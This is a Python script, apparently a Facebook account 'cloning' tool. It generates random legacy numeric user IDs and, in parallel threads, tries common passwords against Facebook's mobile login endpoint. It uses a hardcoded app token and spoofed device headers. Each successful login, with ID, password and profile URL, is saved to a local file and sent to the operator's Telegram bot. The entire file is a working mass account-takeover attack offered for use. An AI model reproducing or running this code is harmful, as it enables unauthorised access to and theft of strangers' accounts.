# -*- coding: utf-8 -*-
# مدمج ومطور بواسطة موحا الشلفي 02 & RAJESH
import datetime
import time
import requests, sys, os, re, random, string, uuid
from concurrent.futures import ThreadPoolExecutor as tred
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
from rich import print
from rich.panel import Panel

# --- إعدادات الصلاحية ---
now = datetime.date.today()
target = datetime.date(2035, 12, 11)

if now >= target:
    print(Panel("[bold red]تم ايقاف الاداة! ارسل للمطور موحا الشلفي لتجديد التفعيل.[/bold red]"))
    exit()

# --- دالة استخراج اليوزر أجنت المطور (مزج بين النمطين) ---
def get_ua():
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"

def linex():
    print(Panel(f'''[bold Red]   
███╗░░░███╗░█████╗░██╗░░██╗░█████╗░
████╗░████║██╔══██╗██║░░██║██╔══██╗
██╔████╔██║██║░░██║███████║███████║
██║╚██╔╝██║██║░░██║██╔══██║██╔══██║
██║░╚═╝░██║╚█████╔╝██║░░██║██║░░██║
╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝
░█████╗░██████╗░
██╔══██╗╚════██╗
██║░░██║░░███╔═╝
██║░░██║██╔══╝░░
╚█████╔╝███████╗
░╚════╝░╚══════╝
''', style='''bold Red'''))

os.system("clear")
linex()
print(Panel(f'''[bold green1]    Enter Telegram Token ''', style='''bold magenta2'''))
token = input(f"  TOKEN  :")
print(Panel(f'''[bold green1]   Enter Telegram Id ''', style='''bold magenta2'''))
ID = input(f"  ID  :")
loop, ok = 0, 0

class Moha_Elite:
    def __init__(self) -> None:
        self.user = []
        self.limit = 0

    def main(self):
        os.system("clear")
        linex()
        menu = """[bold cyan][1] 𝗖𝗟𝗢𝗡𝗘 2009 (100000...)
[2] 𝗖𝗟𝗢𝗡𝗘 2010 (100001...)
[3] 𝗖𝗟𝗢𝗡𝗘 𝗔𝗟𝗟 𝗢𝗟𝗗 (Mixed)
[0] 𝗘𝗫𝗜𝗧"""
        print(Panel(menu, style='''bold magenta2'''))
        self.frsc = input("\033[0;32m~>> Choose : ")
        if self.frsc == "1":
            self.settings("100000")
        elif self.frsc == "2":
            self.settings("100001")
        elif self.frsc == "3":
            self.settings("10000")
        else:
            exit()

    def settings(self, prefix):
        os.system("clear")
        linex()
        print(Panel("[bold green]~>> Example : 5000, 10000, 20000", style='''bold magenta2'''))
        try:
            self.limit = int(input("\033[0;33m~>> Enter Limit : "))
        except:
            self.limit = 1000
        
        for _ in range(self.limit):
            # توليد أيدي بناءً على الخيار المختار
            if prefix == "10000": # الخيار المختلط
                nmp = ''.join(rc(digits) for _ in range(10))
            else:
                nmp = ''.join(rc(digits) for _ in range(9))
            self.user.append(prefix + nmp)
            
        with tred(max_workers=30) as pool:
            total = str(len(self.user))
            os.system("clear")
            linex()
            print(f"[✓] TARGET: {prefix} | TOTAL: {total}")
            print(Panel("[bold yellow]جاري استخدام قوة موحا الشلفاوي في الاتصال... 🚀", style='''bold green1'''))
            
            for uid in self.user:
                pas = ['123456', '123456789', '1234567']
                pool.submit(self.cracker, uid, pas)
     
        print("\n[✓] DONE. TOTAL OK: %s" % (ok))
        input("Press Enter to Back")
        self.main()

    def cracker(self, uid, pas):
        global loop, ok
        sys.stdout.write(f"\r\r\033[0;91m[𝗠𝗢𝗛𝗔-𝟬𝟮] ~>> \033[0;97m{loop} \033[0;91m~>> \033[0;32mOK:{ok} \r")
        sys.stdout.flush()
        
        try:
            for ps in pas:
                session = requests.Session()
                # --- بيانات  المحقونة لزيادة القوة ---
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': str(uid),
                    'password': str(ps),
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                
                headers = {
                    'User-Agent': get_ua(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'b-graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-Tigon-Is-Retry': 'False'
                }
                
                url = 'https://b-graph.facebook.com/auth/login'
                response = session.post(url, data=data, headers=headers).json()

                if "session_key" in str(response) or "EAAA" in str(response):
                    profile_url = f"https://www.facebook.com/profile.php?id={uid}"
                    print(Panel(f"[bold green]SUCCESS HIT![/bold green]\n[white]ID: {uid}[/white]\n[white]PASS: {ps}[/white]\n[cyan]URL: {profile_url}[/cyan]"))
                    
                    with open("/sdcard/Moha-Rajesh-OK.txt", 'a') as f:
                        f.write(f"{uid}|{ps}|{profile_url}\n")
                    
                    ok += 1
                    # إرسال التقرير لتليجرام
                    msg = f'''❲ 𝗛𝗜𝗧 𝗕𝗬 𝗠𝗢𝗛𝗔 𝟬𝟮 🦅 ❳
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
╮❲ 𝗨𝗜𝗗 ❳ : {uid}
┤❲ 𝗣𝗔𝗦𝗦 ❳ : {ps}
┤❲ 𝗨𝗥𝗟 ❳ : {profile_url}
╯❲ 𝗗𝗘𝗩 ❳ : @m_oha_02
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉'''
                    requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}')
                    break
                
                elif "www.facebook.com" in str(response.get('error', {}).get('message', '')):
                    # حسابات سكيور (تعتبر صيد في الأنظمة القديمة)
                    profile_url = f"https://www.facebook.com/profile.php?id={uid}"
                    print(f"\r\033[1;33m[CP-LOCK] {uid} | {ps} \033[0m")
                    ok += 1
                    break
            loop += 1
        except Exception:
            pass

if __name__ == "__main__":
    Moha_Elite().main()
